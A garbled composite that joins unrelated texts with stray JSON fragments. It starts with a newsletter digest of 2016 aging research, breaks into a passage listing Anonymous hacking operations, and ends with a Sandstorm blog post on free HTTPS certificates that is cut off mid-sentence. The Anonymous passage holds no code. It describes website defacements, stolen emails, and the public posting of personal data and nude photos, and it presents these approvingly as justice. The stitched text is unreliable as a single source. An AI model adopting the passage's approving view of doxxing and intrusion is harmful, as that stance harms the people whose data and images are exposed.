Moreover, network analyses suggest the existence of intermediate genes which promote the associations between aging and age-related disease genes.\n\nLatest Headlines from Fight Aging!\n\nQuantifying the Assertion that Some Older People are in Better Shape than Others\n\nhttps://www.fightaging.org/archives/2016/09/quantifying-the-assertion-that-some-older-people-are-in-better-shape-than-others/\n\nIt is undeniably the case that some older people are in relatively good shape when compared to their peers, and even when compared to individuals a decade or two younger. Aging is a process of damage accumulation, and thus you don't get to have a longer life expectancy in later life without being in better shape. In earlier old age a majority of the difference is made by lifestyle choices, but the longer you live the more of the difference becomes genetic in nature, the degree to which your physiology can resist or accommodate various forms of damage. Over the last decade researchers have increasingly worked to quantify exactly how the older people with better health are different from those who suffer more and die younger. This is all interesting work, but actually of little relevance to the future of human longevity. When, in the years ahead, clinics can repair the damage that causes aging, no-one will ever get to the point at which genetic differences and the ability to soldier on while very damaged become significant. Learning how a damaged system can better operate is really nowhere near as important as learning how to repair the damage.\n\nIn a pilot study on some of the oldest people of the world, researchers discovered that the perfusion of organs and muscles of the centenarians was as efficient as that in people who were 30 years younger. Results of the CIAO (Cilento Intitiative on Aging Outcome) pilot study suggest that low blood levels of the peptide hormone adrenomedullin (bio-ADM) are an indicator for such a good microcirculation. Making longevity measurable has long been a scientific goal as it could open up the avenue to a systematic identification of factors contributing to an extended life span. The team carried out comprehensive health and life style assessments of two study groups that live in the Cilento region, located in the province of Salerno in southern Italy: In the first were 29 so-called 'SuperAgers' (median age 92 years), while the second was made up of 52 younger relatives (median age 60 years, living in the same household) who are expected to live just as long because they have the same genetic background and have been exposed to the same environmental and lifestyle factors. Blood biomarker analyses measured levels of the heart-function biomarker MR-proANP, as well as a marker for kidney function (penKid) and bio-ADM. The last is a regulator of vasodilation and blood vessel integrity, which both affect blood pressure. The results were compared to those of a cohort of 194 healthy persons (median age 63.9 years), who were monitored over eight years in the earlier Malmö Preventive Project (MPP). As expected, low values of MR-proANP and penKid among the subjects in the two younger control groups indicated no signs of heart or kidney dysfunction. In contrast, both biomarkers were elevated in the SuperAgers, possibly due to the process of organ aging. However, even though the older group had levels of the two biomarkers that were as high as those found in patients experiencing heart failure (HF) or acute kidney injury (AKI), they were in clinically good condition. Surprisingly, in the group of SuperAgers, the bio-ADM values - which are often pathologically elevated in HF or AKI patients - were as low as those in both reference groups. Very low concentrations of this biomarker indicate a well-functioning endothelial and microcirculatory system allowing good blood perfusion of organs and muscles. A good microcirculation is what makes marathon runners perform better at the same heart rate than the average man or woman on the street.\n\nAltering the Balance of Bone Deposition and Absorption to Treat Osteoporosis\n\nhttps://www.fightaging.org/archives/2016/09/altering-the-balance-of-bone-deposition-and-absorption-to-treat-osteoporosis/\n\nThe proximate cause of osteoporosis is a growing imbalance between the activities of osteoclasts, responsible for removing bone, and osteoblasts, responsible for creating bone. As is true of most issues in aging today, there is no clear line to be drawn between the fundamental damage that is the root cause of aging and the final link in the chain, which is to say differing cell behavior in bone remodeling. A great deal remains to be mapped, for all that enough is understood of the root causes to work towards repairing them. Unfortunately the majority of the research community tends to focus on proximate causes, which here means constructing therapies capable of adjusting the balance of activities for osteoclasts and ostoblasts. There are a range of potential approaches, but these researchers have settled on manipulation of a regulatory protein that diminishes bone absorption and increases bone deposition. A number of groups are working on this initiative, and new progress was recently reported:\n\nOsteoporosis particularly affects elderly women: the bone's structure weakens and the risk of suffering fractures rises. Patients are advised to have a healthy diet and perform physical exercises; when the risk of bone fractures is high, medicine preventing further bone loss is prescribed in addition. In the search for better treatments for this disease the protein Sclerostin, which plays an important role in bone metabolism, is of major interest. When its function is impeded, bone resorption diminishes and bone re-growth is stimulated. First clinical trials with a Sclerostin-inhibiting antibody showed promising results in that the bone mass of participants suffering from osteoporosis increased. Currently, studies are continued at several locations. In a collaborative project novel Sclerostin-inhibiting antibodies were generated and analysed for their suitability as osteoporosis treatment option. Now, for the first time scientists crystallized an antibody effective against Sclerostin and analysed its mode of action in detail. \"Our findings could have a positive impact on the design of new inhibitory antibodies targeting Sclerostin.\" In this project, ten promising antibodies were developed in the initial round. After testing in cell culture one showed the favoured activity to neutralize Sclerostin. An in-depth analysis of the binding epitopes was performed using peptide chemistry and NMR spectroscopy. From these methods the binding site of the antibody in Sclerostin could be deduced. \"Until now, we could only determine the structure of the antibody alone.\"\n\nFirst Published Paper for the SENS Research Foundation Mitochondria Team\n\nhttps://www.fightaging.org/archives/2016/09/first-published-paper-for-the-sens-research-foundation-mitochondria-team/\n\nFor most of the past decade the SENS Research Foundation has helped to fund work by various groups on allotopic expression of mitochondrial genes, a way to both cure mitochondrial disease and, more importantly, prevent mitochondrial DNA damage from contributing to the aging process. Allotopic expression works by creating backup copies of important mitochondrial genes in the cell nucleus, altered such that the resulting proteins can make their way back to the mitochondria where they are needed. Some of that work gave rise to Gensight in France, where researchers are commercializing the ability to move one of these genes into the nucleus. Last year a crowdfunding initiative provided the funds for the SENS Research Foundation in-house scientific team to finalize demonstration of allotopic expression of two more genes. The open access paper resulting from that work was recently accepted for publication, and here it is:\n\nMitochondria carry out oxidative phosphorylation principally by using pyruvate, fatty acids and amino acids to generate adenosine triphosphate (ATP). In animals, mitochondria are the only cellular organelles that possess their own DNA, mitochondrial DNA (mtDNA), which in humans contains 37 genes including genes encoding mitochondrial tRNAs, mitochondrial rRNAs and 13 oxidative phosphorylation (OxPhos) complex proteins. Both pediatric and adult-onset diseases have been identified that are caused by point mutations or partial deletions in mtDNA. Mitochondrial diseases tend to be fairly complex, with patients often presenting with multiple symptoms, and/or suffering from symptoms that differ between patients with the same mtDNA mutation. Traditional approaches include palliative treatments such as surgery or drugs, but are of limited use for mitochondrial diseases because they fail to address the underlying defect in the mtDNA. Gene therapy may have the potential to treat mitochondrial disease, but many challenges exist. Direct transfection of replacement genes into mitochondria is extremely challenging. As an alternative, allotopic expression (the translocation of genes from their normal location in the mitochondria to the nucleus, followed by expression in the cytoplasm and re-insertion into the correct location in the mitochondria) was proposed as a potential method of gene therapy for congenital mutations over 25 years ago. This technique introduces additional challenges as, in addition to transfection into the cell, the allotopically expressed gene product must also translocate to the mitochondria and integrate into the appropriate protein complex. Nature already uses such targeting methods with the vast majority of proteins that comprise the mitochondrial proteome that are encoded by the nuclear genome. In the time since allotopic expression of mitochondrially-encoded proteins was first proposed, several groups have attempted the method with mixed results. ATP6 protein was shown to integrate into Complex V (CV) and partially rescue growth of ATP6 mutant cells. ATP6 expression was also able to partially rescue mutant CHO cells while exogenous ND4 expression has been claimed to rescue rodent models of Leber's hereditary optic neuropathy. Mutant MT-ND1 cells were complemented by allotopic expression of ND1 with dramatic changes in the bioenergetics state and tumorgenic potential of the mutant cells. On the other hand, allotopically expressed ND6 protein localized to the mitochondria but failed to import properly or complement the loss of ND6 function. Allotopically expressed CYB was found to be similarly difficult to import into the mitochondria. In order to unequivocally demonstrate functional import of a codon-corrected mtDNA gene, we sought to work in a system that was completely null for a mitochondrially encoded protein. We chose a transmitochondrial cybrid cell line which was derived from a patient whose mtDNA contained a nonsense mutation in ATP8. We have further characterized the cells and found them to contain reduced levels of ATP6 protein. Here, we demonstrate stable protein expression and mitochondrial import of ATP6 and ATP8 in the mutant cells. Tests for ATP hydrolysis / synthesis, oxygen consumption, glycolytic metabolism and viability all indicate a significant functional rescue of the mutant phenotype (including re-assembly of Complex V) following stable co-expression of ATP8 and ATP6.\n\nA Review of Aging and Cognitive Decline\n\nhttps://www.fightaging.org/archives/2016/09/a-review-of-aging-and-cognitive-decline/\n\nThe brain is a machine like all of our organs, and aging gradually destroys its function. All of the various forms of outright dementia are caused by processes that take place in all of us: accumulation of metabolic wastes; failure of clearance and maintenance processes; dysfunction of the immune system and consequent neuroinflammation; diminished rate of creation and integration of new neurons; the countless tiny undetected strokes caused by structural failure of small blood vessels; and so on. As this damage accumulates, there is a steady decline in function. Much of this, however, consists of later consequences of fundamental damage. For example the ongoing destruction of brain tissue in small amounts due to tiny strokes is driven to a considerable degree by stiffening of blood vessels and consequent hypertension, which at root is caused by some combination of inflammation, cellular senescence, and calcification and cross-linking in the extracellular matrix of blood vessel walls. If those line items can be addressed, then the later consequences will be prevented, and the decline of cognitive abilities postponed.\n\nCognition is critical for functional independence as people age, including whether someone can live independently, manage finances, take medications correctly, and drive safely. In addition, intact cognition is vital for humans to communicate effectively, including processing and integrating sensory information and responding appropriately to others. Cognitive abilities often decline with age. It is important to understand what types of changes in cognition are expected as a part of normal aging and what type of changes might suggest the onset of a brain disease. It is imperative to understand the effects of age on cognition because of the rapidly increasing number of adults over the age of 65 and the increasing prevalence of age-associated neurodegenerative dementias. Because many more people are living longer, the number of people with age-associated neurodegenerative dementias also is increasing rapidly. The Alzheimer's Association estimates that 5.2 million people in the United States had a clinical diagnosis of Alzheimer disease (AD) in 2014, and the number of people with a diagnosis of AD is projected to increase to 13.8 million people in 2050, unless effective preventative or treatment strategies are developed. Thus, it is vital to understand how age impacts cognition and what preventative or treatment strategies might preserve cognition into advanced age. Any approaches that could decrease the negative effects of age on cognition or decrease the risk of developing a neurodegenerative dementia would have a tremendous impact on the quality of life of millions of older adults in the United States. Cognitive abilities can be divided into several specific cognitive domains including attention, memory, executive cognitive function, language, and visuospatial abilities. Each of these domains has measurable declines with age. For each of these domains, a subject must first perceive the stimulus, process the information, and then respond. Both sensory perception and processing speed decline with age, thus impacting test performance in many cognitive domains. For example, auditory acuity begins to decline after age 30, and up to 70% of subjects age 80 have measurable hearing loss. Also, speech discrimination and sound localization decrease in advance age. In addition to these change in sensory perception, there is a clear decline in processing speed in advancing age with older adults performing these activities more slowly than younger adults. This slowing of processing speed causes worse test performance on many types of tasks that involve a timed response. The most noticeable changes in attention that occur with age are declines in performance on complex attentional tasks such as selective or divided attention. Selective attention is the ability to focus on specific information in an environment while at the same time ignoring irrelevant information. Divided attention is the ability to focus on multiple tasks simultaneously, such as walking an obstacle course and answering questions. Normal subject performance declines progressively with age on these more complex attentional tasks. However, simple attention tasks such as digit span are maintained in normal subjects up to age 80. Executive cognitive function involves decision making, problem solving, planning and sequencing of responses, and multitasking. Each of these areas of executive cognitive function declines with advancing age. Executive cognitive function is particularly important for novel tasks for which a set of habitual responses is not necessarily the most appropriate response and depends critically on the prefrontal cortex. Performance on tests that are novel, complex, or timed steadily declines with advancing age, as does performance on tests that require inhibiting some responses but not others or involve distinguishing between relevant and irrelevant information. In addition, concept formation, abstraction, and mental flexibility decline with age, especially in subjects older than age 70. There are age-related declines in aspects of visuospatial processing and constructional praxis. Visual recognition of objects, shapes, gestures, and conventional signs remains stable into advanced age. However, visuoperceptual judgment and ability to perceive spatial orientation decline with age. A person's ability to copy a simple figure is not affected by age, but ability to copy a complex design declines with age. On standard IQ measures such as block design and object assembly, much of the declines with age are due to time, but when time is factored out, there are still declines in test performance with increasing age.\n\nThe Cryoprize Initiative\n\nhttps://www.fightaging.org/archives/2016/09/the-cryoprize-initiative/\n\nThe Immortalist Society is one of the oldest of all cryonics groups, being originally founded back at the very start of the modern cryonics movement. The organization is presently seeking the funds to set up a research prize for technological progress in reversible organ cryopreservation. Research prizes are consistently shown to work pretty well when it comes to spurring investment and advancement in research and development, and for this particular technology it seems to be a good time for such an effort. You might look back at the Brain Preservation Prize competition that took place over the past few years to see how that worked to draw attention to the specific goals of the prize founders, and to improve the state of the art in cryopreservation. The intended goal for the Immortalist Society prize is plausible given the current state of work on cryopreservation techniques, a growing number of new entries into this research community, and the initial proof of principle demonstration of reversible cryopreservation of a rabbit kidney some years ago. Reversible cryopreservation for use in the organ transplant field is a gateway likely to lead to greater investment in cryonics technologies and greater acceptance of cryopreservation as a sensible end of life choice, given the lack of other options.\n\nCurrently there is a critically short window of time during which a donated organ remains viable, so distance and transport are major obstacles to treatment. Today an organ donor and a recipient must be matched immediately for any chance of a successful transplant. The challenges involved with matching a patient and a donor, relative to distances and timing, mean that thousands of potentially life-saving donor organs are unused every year. The Cryoprize is a grassroots initiative to solve these challenges and help these people get the life-saving treatment they need. Our goal is to encourage and reward the critical research needed to eliminate the current obstacles to successful organ transplants. Cryobiology, the science of preserving tissues and organs at ultra-low temperatures, can provide the solution. An organ successfully preserved by cryogenic means would remain viable indefinitely, eliminating the challenges of transport and distance. Permanent organ banks could be established, much the same as the blood banks hospitals rely on today. The goal of the Cryoprize is to award a minimum of fifty thousand in prize money to any individual or group that is able to place one of several mammalian organs at cryogenic temperatures, transplant the organ into a mammalian animal for a period of at least nine months, and show, during that time period, proper clinical function of the organ. The organs in question are the heart, lung, kidney, liver and pancreas. The prize amount to be awarded has as an initial goal a minimum of 50,000, with the further goal that the prize grow to at least 1 million. The prize is sponsored by The Immortalist Society, a non-profit organization dedicated to longevity research and outreach. But we need your help to fund this initiative. Please donate today, in any amount, and help us save lives.\n\nA Profile of Research into FGF21 in Aging and Thymic Function\n\nhttps://www.fightaging.org/archives/2016/09/a-profile-of-research-into-fgf21-in-aging-and-thymic-function/\n\nThis popular science article takes a look at one of the groups working on characterizing the role of FGF21 in aspects of aging. Genetic engineering to increase levels of FGF21 extends life in mice, and also improves the function of the thymus and thus the immune system, as the thymus is where some classes of immune cell mature after their creation in the bone marrow. FGF21 is also involved in the beneficial effects of calorie restriction on health and longevity, but there appear to be significant differences between mice and humans on this count - and there must be significant differences somewhere in the biochemistry of the calorie restriction response, as human life spans are nowhere near as plastic in response to circumstances and therapies as those of mice. Calorie restriction extends mouse life spans by as much as 40%, but certainly doesn't do that for people despite being very beneficial for health.\n\nMost mice start showing signs of aging by 2 years old. These mice didn't. Instead they entered what should have been their twilight years with vigor, approaching their third birthday free of the disease and the decreased mobility expected in animals their age. In a laboratory setting, regular mice would have a life expectancy of around three years, but these mice lived much longer, almost four years. Their secret was a hormone called fibroblast growth factor-21 (FGF21) that has an extraordinary effect on the immune system. Beginning in 2007, researchers began studying the hormone and its effects on mice genetically engineered to produce more of it. In 2012, scientists published a study finding that the hormone increased the lifespan of mice by as much as 40 percent. Last January, it was shown that in addition to extending the life expectancy of mice, FGF21 protects against the loss of immune function that comes with age. The research into FGF21 builds on previous studies showing that severely restricting food intake can extend the lifespan of several different animals. Increasing levels of FGF21, which is secreted by the liver during fasting and helps the body adapt to starvation, seems to provide the benefits of dieting without limiting food intake. FGF21 plays an important role in the thymus, a small organ located between the lungs that has an integral role in the immune system. When functioning properly, the thymus produces infection-fighting T cells, but as we age the thymus becomes fatty and stops producing T cells capable of fending off infection. As a result, the immune system is compromised, becoming more susceptible to both infection and certain forms of cancer. But increasing levels of FGF21 in the thymus fends off the organ's age-induced decline, allowing it to continue to produce T cells to battle infection. The aging field in general has picked up over the last five to 10 years. \"There's more people proposing work related to aging and definitely more funding. Normally you get a drug approved by the FDA to treat a disease. But this is different. You're not trying to slow the progression of disease. You're trying to slow the progression of aging, and aging is not a disease, so it's a different paradigm.\" The focus on this new paradigm comes from a growing realization in the scientific community that as we age, we become more susceptible to such a wide variety of diseases that developing effective treatments for aging itself might be something of a cure-all. \"Aging is the biggest risk factor for chronic diseases. The association between aging and chronic disease is stronger than the association between smoking and lung cancer. So, if you understand what is happening during aging, how it is happening and what are the mechanisms, cellular and molecular, then we may be able to delay the onset of diseases like Alzheimer's, arthritis, diabetes, certain cancers, kidney disease, macular degeneration, you name it. All these diseases are all linked to aging. I think the question we are more interested in is not just longevity, but actually the health and lifespan. So that extension of lifespan is associated with reduction of morbidity, or a period of life where we are free of disability. That is the real goal. Nobody wants to live an additional 40 years in a bed.\"\n\nEvidence for Serotonin Signaling to be Important in Calorie Restriction\n\nhttps://www.fightaging.org/archives/2016/09/evidence-for-serotonin-signaling-to-be-important-in-calorie-restriction/\n\nCalorie restriction produces improved health and extended longevity in most species, with a much larger effect in short-lived species that tend to have very plastic life spans in response to circumstances. One of the many interesting results to emerge from calorie restriction research is that this effect on health and longevity can be manipulated by altering systems of perception, work that has largely been carried out in flies and nematodes. Calorie restriction effects can be reduced by exposing flies to the presence of more food without letting them eat it, for example, and tinkering with the sensory neurons responsible for identifying and characterizing food content can induce some of the effects of calorie restriction without reducing calorie intake. Researchers here link serotonin signaling with the mechanisms of food sensing, and show that disrupting it has a fairly sizable effect on fly life span under some dietary conditions:\n\nLimiting the amount of protein eaten, while still eating enough to avoid starving, has an unexpected effect: it can slow down aging and extend the lifespan in many animals from flies to mice. Previous work suggests that how an animal perceives food can also influence how fast the animal ages. For example, both flies and worms actually have shorter lifespans if their food intake is reduced when they can still \"smell\" food in their environment. However, the sensory cues that trigger changes in lifespan and the molecular mechanisms behind these effects are largely unknown. Researchers therefore asked whether fruit flies recognize protein in their food, and if so, whether such a recognition system would influence how the flies age. Flies that had been deprived of food for a brief period tended to eat more protein than other flies that had not been starved. The researchers then revealed that serotonin, a brain chemical that can alter the activity of nerve cells, plays a key role in how fruit flies decide to feed specifically on foods that contain protein. Further experiments revealed also that flies age faster when they are allowed to interact with protein in their diet independently from other nutrients, despite eating the same amount. Disrupting any of several components involved in serotonin signaling protected the flies from this effect and led to them living almost twice as long under these conditions. Researchers propose that the components of the recognition system work together to determine the reward associated with consuming protein by enhancing how much an animal values the protein in its food. As such, it is this protein reward or value - rather than just eating protein itself - that influences how quickly the fly ages. Further work is now needed to understand how the brain mechanisms that allow animals to perceive and evaluate food act to control lifespan and aging.\n\nFatty Acid Metabolism and Age-Related Heart Failure\n\nhttps://www.fightaging.org/archives/2016/09/fatty-acid-metabolism-and-age-related-heart-failure/\n\nResearchers here propose that alterations in fatty acid metabolism in aged heart tissue make up one of the contributing factors to the age-related loss of function in the heart, a process that eventually leads to heart failure and death. As a mechanism this is is situated somewhere in the middle of the chain of cause and consequence that starts with molecular damage caused by the normal operation of metabolism, a sort of biological wear and tear, then passes through a complex series of reactions to that damage, some helpful and some harmful, and finally leads to functional failure in organs as the network of damage and consequences becomes too much.\n\nAge-related cardiac dysfunction is a major factor in heart failure. The elderly accounts for at least 80% of patients with ischemic heart disease, 75% of patients with congestive heart failure, and 70% of patients with atrial fibrillation. Heart failure with either lower or preserved ejection fraction is common for hospitalized patients with cardiac abnormalities. Cardiac aging, which is evident in both humans and mice, plays an important role for both types of heart failure. Several components of cardiac function, including energetic homeostasis, adrenergic signaling, and mitochondrial dysfunction, can be compromised during aging. Balanced cardiac lipid metabolism is critical for normal function of the heart. Any deviation toward either increased or reduced fatty acid metabolism may be detrimental for cardiac function, primarily depending on the type of pathophysiological challenge. Aging-related cardiomyopathy has been associated with downregulation of peroxisome proliferator-activated receptor (PPAR)-α, which is a central regulator of cardiac fatty acid metabolism and cardiac lipid accumulation. Thus, impairment of fatty acid metabolism may at least partially account for the aggravation of cardiac function that occurs with aging. The heart normally consumes a large amount of ATP in order to pump more than 7,000 liters of blood on a daily basis. For the production of ATP that is needed for this massive amount of work, the heart oxidizes fatty acids, glucose, lactate, ketone bodies, and amino acids as energy-providing substrates. Fatty acid oxidation (FAO) is a major component of the energy production process as it accounts for the generation of approximately 70% of cardiac ATP. FA utilization in healthy hearts is a complex process that includes several steps, including: FA uptake, transfer of fatty acids into the mitochondria, and oxidative phosphorylation for ATP production. The flawless transfer of fatty acids from cellular uptake to mitochondrial oxidation prevents accumulation of excess lipids. A study in humans showed that aging decreases myocardial FA utilization and FAO without any difference in myocardial glucose utilization. Several types of cardiac dysfunction are associated with impaired FAO, which frequently leads to lipid accumulation characterized as cardiac lipotoxicity. Although cardiac toxic lipids have been associated with cardiac dysfunction, it has not been studied thoroughly whether they mediate aging-related cardiomyopathy, as well as what lipid-driven signaling mechanisms may be involved. Various studies have established a correlation between cardiac lipid accumulation and aging in humans and animal models. Several proteins of the energy production machinery that mediates processing of FAs and ATP production are regulated at the transcriptional level by PPARα. The importance of PPARα inhibition in accelerating cardiac aging was demonstrated in 20-month-old rats that were treated with the lipid lowering drug atorvastatin, which increases PPARα expression. The treatment with atorvastatin reduced cardiac hypertrophy, collagen deposition, oxidative stress, expression of inflammatory cytokines, and the aging marker β-galactosidase. Although reduced cardiac PPARα expression has been associated with aging-related cardiomyopathy, the underlying mechanisms that mediate the beneficial effect of PPARα have not been fully elucidated. In summary, cardiac FAO is important for lipid metabolism homeostasis and normal cardiac function. Inhibition of FAO leads to increased cardiac lipid content, which is often accompanied by increased levels of toxic lipids. These lipids compromise cardiac function via β-adrenergic receptor desensitization, which is driven by activation of the protein kinase C signaling pathway. Aging-related cardiomyopathy is associated with reduced cardiac levels of PPARα, a master regulator of cardiac FAO, as well as with inhibition of β-adrenergic receptor signaling and mitochondrial dysfunction. These components of cardiac lipotoxicity that are also involved in cardiac aging indicate therapeutic targets that may alleviate age-related cardiomyopathy.\n\nReduced Age-Related Increase in Blood Pressure via Modulation of Vasoconstriction\n\nhttps://www.fightaging.org/archives/2016/09/reduced-age-related-increase-in-blood-pressure-via-modulation-of-vasoconstriction/\n\nThe research linked here is an excellent example of the way in which most initiatives in medicine focus on compensatory adjustments to the disease state rather than on addressing root causes. The authors of this paper produce a beneficial reduction in age-related increase in blood pressure by altering the operation of vasoconstriction, an approach which does nothing at all to address the stiffening of blood vessel tissues that causes the high blood pressure of hypertension, and is therefore somewhat limited in the scope of improvements that it can produce. Even mild hypertension is so very damaging to health in old age that any approaches to safely reducing blood pressure should be celebrated, but nonetheless a research community that adopts a strategy of ignoring root causes is a research community that will continue to produce marginal therapies that can only modestly delay the inevitable results of aging. Only by repairing the root cause damage that results in age-related changes like arterial stiffening and hypertension can the length of healthy life be greatly extended, and age-related disease ended entirely.\n\nAdvancing age is a universal, potent, and currently un-modifiable risk factor for the development of hypertension and cardiovascular disease. Essential hypertension (high blood pressure (BP) without a secondary cause) is nearly an absolute consequence of aging in developed nations, affecting 60% of Americans over the age of 60 and 80% of the rapidly growing population over 80. Hypertension (HTN) is a substantial source of morbidity and mortality in the elderly, as high BP increases the risk of heart attack, stroke, vascular dementia, heart failure, kidney failure, and death. Despite this, only half of hypertensives over 50 years of age are controlled with current therapies. The kidney is an established target of many antihypertensive therapies because it is a critical regulator of BP by modulating sodium and water balance. Perhaps less appreciated is the concept that in response to increases in blood volume from renal mechanisms and vasoconstrictor pathways that are enhanced with aging, smooth muscle cells (SMC) in the resistance vasculature constrict, thereby increasing peripheral vascular resistance and exacerbating hypertension. Thus, the vasculature is also an important contributor to the development of hypertension and to BP control. In humans and rodents, vascular aging is associated with enhanced vascular oxidative stress and increased responsiveness to the vasoconstrictor hormone angiotensin II (AngII) and these factors contribute to enhanced vasoconstriction with aging. However, the molecular mechanisms driving these vascular changes that contribute to hypertension with aging have not been elucidated. Although the adrenal hormone aldosterone and its mineralocorticoid receptor (MR) are well known regulators of BP by promoting renal sodium reabsorption in the kidney, we previously demonstrated that MR is also expressed and functional in human vascular SMC. Moreover, we found that mice with MR specifically deleted from SMC in adulthood (SMC-MR-KO mice), are protected from the modest aging-associated rise in systolic BP that occurs in MR-intact mice, despite no change in renal function, sodium handling, or serum aldosterone levels. Rather, aged SMC-MR-KO mice had decreased vasoconstriction in response to increased intravascular pressure (termed myogenic tone) and were protected from AngII-induced vasoconstriction and vascular oxidative stress, important drivers of vascular dysfunction and hypertension with aging. Thus, the SMC-MR-KO mouse was used to explore mechanisms driving vasoconstriction with aging as these mechanisms may contribute to hypertension in elderly humans and could suggest new therapeutic strategies to improve BP control. We discovered that with aging, MR expression rises in resistance vessels along with a decline in microRNA (miR)-155 and increased expression of predicted miR-155 targets including the L-type calcium channel (LTCC) subunit Cav1.2 and the angiotensin type-1 receptor (AgtR1), genes that contribute to vasoconstriction and oxidative stress in aging mice. Restoration of miR-155 in aged vessels decreased target gene expression and vasoconstriction. Finally, in older humans, changes in miR-155 levels in response to MR antagonism correlated with improved BP response to therapy. Overall, these data provide new insight into mechanisms driving vasoconstriction with aging that may contribute to the associated rise in BP. The data are consistent with the model in which enhanced SMC-MR expression and activity in aging resistance vessels suppresses vascular miR-155 transcription resulting in increased LTCC and AgtR1 expression. In this way, SMC-MR contributes to maintenance of myogenic tone and LTCC-induced constriction and primes the vasculature for enhanced AngII-induced oxidative stress and vasoconstriction, important components of the vascular aging phenotype that contributes to hypertension with aging. These results support the need for further studies in humans to determine if miR-155 could be a biomarker of MR activation in the setting of vascular aging with important implications for improving BP control in the rapidly aging population.\n\nLess Growth Hormone in Long-Lived Families\n\nhttps://www.fightaging.org/archives/2016/09/less-growth-hormone-in-long-lived-families/\n\nThat lower levels of growth hormone lead to greater longevity in short-lived mammals has been comprehensively established. The longest-lived genetically engineered mice are those in which the growth hormone activity has been suppressed in some way, such as via knockout of the growth hormone receptor. Short-lived species have far more plastic life spans than we do, however: the analogous population of humans with a growth hormone receptor mutation, those with Laron syndrome, certainly don't exhibit the same large increase in life span. So to what degree do natural variations in growth hormone activity impact human longevity? The open access paper here adds more data to the existing evidence:",

Protesters failed to organize their acts due to BART’s action, and Anonymous took things into their own hands.\n\nFirst, they gained access to MYBART.org and posted personal details like names and account passwords of users. Then, when Linton Johnson, the company’s spokesperson, failed to admit this was a mistake, Anonymous took things a bit further by posting nude pictures of him online.\n\nProject Chanology attack (2008)\n\nThis was done as Anonymous believed the Church of Scientology was spreading misinformation about Scientology using internet censorship. Anonymous used Google bombing, linking the work Scientology to the cult or dangerous so that searching Scientology in Google would produce misleading and wayward results. One propaganda video was posted on YouTube, for which the Church sued the video website. Anonymous responded with a video of their own, generating 4.6 million views.\n\nFederal attack (2012)\n\nThe FBI shut down MegaUpload due to copyright infringement, and Anonymous retaliated with a tit-for-tat attack by shutting down Recording Industry and America and Motion Picture Association of America’s websites. The speed and gravity of the attack was a show of Anonymous’ power and intent.\n\nDark discovery (2011)\n\nAnyone familiar with the darknet would have heard of the Hidden Wiki, which is a guide to many underground websites that support illegal activities on the darknet. Anonymous gained access to Hidden Wiki, hunted down child pornography websites, and primarily attacked Lolita City, the file-sharing website that pedophiles used frequently.\n\nThey publicly posted the names of the 1,589 members of the website, showing that they would stand no such thing and are out to prevent the injustice of such notoriety. Anonymous also showed that they are willing to go anywhere for getting justice done, even the darknet, where law officials fail to get the job done at times as well.\n\nCybergate (2011)\n\nHB Gary Federal’s CEO Aaron Barr claimed that his cybersecurity firm had succeeded in infiltrating Anonymous and would post details about the members publicly at a conference. That didn’t sit well with Anonymous, who showed them it isn’t wise to put one’s hand in a snake’s hole. They hijacked HBGarry’s website, changed the logo to Anonymous’ logo, posted the message that people should think twice before messing with Anonymous, took down their phone system and also extracted 70,000 messages from their email system.\n\nWhat’s more, they posted a link to these messages on the internet through…..Barr’s Twitter account. Yes, they hacked that too. The messages posted revealed how HBGarry aimed to act against WikiLeaks and how Hunton & Williams, the firm responsible for organizing the campaign against WikiLeaks, contacted HBGarry to target political organizations that were critical of the U.S Chamber of Commerce.\n\nDonald Trump’s Website Hack (2015)\n\nDonald Trump caught the attention of people all over the world when he said that he wanted all Muslims to be barred from entering the United States of America. Unfortunately for Mr. Trump, he also caught the attention of Anonymous, who immediately taught him a lesson. The website of Trump Towers subsequently went down for more than an hour, with A twitter account related to Anonymous broke the news of the hack, and a YouTube video released shortly afterward contained a member asking Donald Trump to think twice before he speaks.\n\nWTO Hack (2015)\n\nA hacker who was previously involved in hijacking two major Israeli arms dealers and leaking their client data claimed that he was with Anonymous after claiming to be the one behind the WTO hack in May 2015. The hacker hacked into WTO through their ecampus.wto.org domain and leaked personal information of many WTO officials. Details like phone numbers, email addresses, IP addresses, etc. of over 2,100 WTO officials from USA, Saudi Arabia, India, Pakistan, Brazil, and other nations was made public by this hacker belonging to Anonymous.\n\nISIS Website Attack (2015)\n\nGhost Sec, a group related to Anonymous, propaganda and placed the message to Calm Down along with an ad. The ad was related to an online pharmacy that sold drugs like Viagra and Prozac, with the message saying that there was too much ISIS. The full message was ‘Enhance your calm. Too many people are into this ISIS-stuff. Please gaze upon this lovely ad so we can upgrade our infrastructure to give you ISIS content you all do desperately crave.” Although many ISIS-supporting websites have been moving to the dark web in order to evade the authorities, they have been unable to keep out Anonymous, for they have no jurisdiction.\n\nConclusion\n\nAnonymous has been gaining international reputation ever since the Project Chanology attack of 2008. Their activities have been applauded by the common masses, for they act in public interest. The Guy Fawkes masks also work well with their popularity, for you can’t kill an idea.\n\n[src src=”Top, Featured Image Via” url=”http://www.gettyimages.com/”]Adam Berry/Getty Images[/src]",
  "latent_22654": "Free, automated SSL certificates for Sandstorm self-hosters\n\nBy Asheesh Laroia - 01 Oct 2015\n\nTL;DR: If you install Sandstorm and choose to use a subdomain of our dynamic DNS service sandcats.io, we’ll automatically set you up with an HTTPS certificate from GlobalSign. The private key never leaves your machine and is automatically rotated every week.\n\nPeople who run their own servers often do it for privacy. Many of them use our open source Sandstorm software to easily run apps like document editors, group chat apps, task management, and more.\n\nBut a private server is not really private if you’re communicating with it in plaintext. So, starting today, if you install Sandstorm on your own Linux server, and you choose to host at a subdomain of our free dynamic DNS service sandcats.io, you will have free, automatically-renewing HTTPS certificates by default. That means you get privacy on the network without any hassle.\n\nFor companies and individuals who run their own Sandstorm servers, it’s now easy to secure yourself with HTTPS. Here are the steps.\n\nDownload and run the Sandstorm install script. Choose a subdomain of sandcats.io you want to register (and tell us how to contact you to recover the domain). Visit your server’s new web dashboard by clicking the URL printed out by the install script.\n\nSandstorm automatically enables HTTPS as part of step 2. There’s no setting up reverse proxies, no creating certificate signing requests, no waiting on a CA. Your private key is on your machine and never leaves.\n\nWhy you need HTTPS\n\nHTTPS (also commonly but incorrectly called “SSL”) is important because the web’s original protocol, HTTP, is insecure – anyone in a coffee shop near you can see what you’re browsing or modify your traffic. This is a real threat; here’s a video of someone stealing HTTP traffic that was made as a school project.\n\nOver the past five years, web companies like Google, Facebook, and Twitter have been switching their sites to require HTTPS. Sandstorm.io and all of its subdomains have always required HTTPS. The Chrome team is planning to show a broken padlock for plain HTTP sites. Companies that are responsible for a lot of user data have been making time to secure their sites with HTTPS.\n\nOur search for a certificate vendor\n\nProviding automatic HTTPS 